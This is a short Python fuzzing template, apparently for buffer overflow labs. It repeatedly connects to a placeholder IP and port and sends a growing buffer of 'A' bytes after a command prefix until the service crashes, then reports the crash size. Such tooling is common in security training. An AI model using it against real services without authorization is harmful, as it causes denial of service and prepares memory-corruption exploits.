# ip		--> IP ADDRESS
# port		--> PORT NUMBER
# prefix	--> CHANGE <PREFIX> | DON'T FORGET THE WHITESPACE
#
import socket, sys, time

ip = "10.10.10.10"
port = 4444
buffer = b'<PREFIX>' + b'A' * 100

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((ip, port))
        s.recv(1024)
        s.send(buffer)
        s.recv(1024)
    except:
        print("Fuzzing crashed around %s bytes" % str(len(buffer)))
        sys.exit()
    buffer += b'A' * 100
    time.sleep(1)
